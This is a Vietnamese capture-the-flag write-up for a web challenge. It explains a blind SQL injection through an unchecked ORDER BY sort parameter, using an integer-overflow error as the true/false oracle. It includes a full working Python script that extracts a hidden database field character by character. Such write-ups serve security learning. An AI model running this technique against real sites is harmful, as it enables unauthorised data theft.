---
title: Doctor Bye Bye
date: 2026-10-12
ctf: FortID CTF 2026
category: web
difficulty: Silver 3
tags:
  - SQL Injection
  - SQLite
---

## Solution

Endpoint `/api/on-call` đưa tham số `sort` thẳng vào `ORDER BY` của câu SQL trong `app.py`, không kiểm tra gì cả, nên viết biểu thức SQL vào `sort` là được. Response không lộ dữ liệu ra ngoài nên đây là blind SQLi.

`initialize_database` chèn sẵn một bác sĩ `id=404` không hiển thị trong danh sách (`listed=0`), flag nằm trong cột `farewell_note` của record này.

Vấn đề là cần một oracle để phân biệt đúng/sai. Dùng `CASE WHEN` kèm lỗi tràn số nguyên:

```sql!
CASE WHEN (<điều kiện>) THEN 1 ELSE abs(-9223372036854775807-1) END
```

Điều kiện đúng -> `ORDER BY 1` -> HTTP 200. Điều kiện sai -> `abs(min int64)` tràn số -> HTTP 400. Từ đây binary search từng ký tự của `farewell_note`:

1. Lấy độ dài flag: `length(farewell_note) > x`.
2. Với từng vị trí `i`, binary search mã Unicode: `unicode(substr(farewell_note, i, 1)) > x`.
3. Ghép các ký tự lại.

Script chạy (đã test với flag giả trên bản local):

```python!
import sys, urllib.parse, urllib.request

BASE = sys.argv[1].rstrip("/")
NOTE = "(SELECT {} FROM doctors WHERE id=404)"

def ask(cond):
    sort = f"CASE WHEN ({cond}) THEN 1 ELSE abs(-9223372036854775807-1) END"
    url = f"{BASE}/api/on-call?sort={urllib.parse.quote(sort)}"
    try:
        with urllib.request.urlopen(url) as r:
            return r.status == 200
    except urllib.error.HTTPError as e:
        return e.code == 200

def extract_int(expr, upper):
    lo, hi = 0, upper
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if ask(f"{expr} > {mid - 1}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

length = extract_int(NOTE.format("length(farewell_note)"), 512)
flag = "".join(
    chr(extract_int(NOTE.format(f"unicode(substr(farewell_note,{i},1))"), 127))
    for i in range(1, length + 1)
)
print(flag)
```

Lưu ý: app check flag bằng `endswith("}")`, nên nếu tạo file flag giả trên local để test thì đừng để dính ký tự xuống dòng ở cuối (dùng `printf` thay vì `echo`), không là tự bẻ oracle của chính mình.

-> Flag: lấy ra qua binary search từng byte của `farewell_note`.
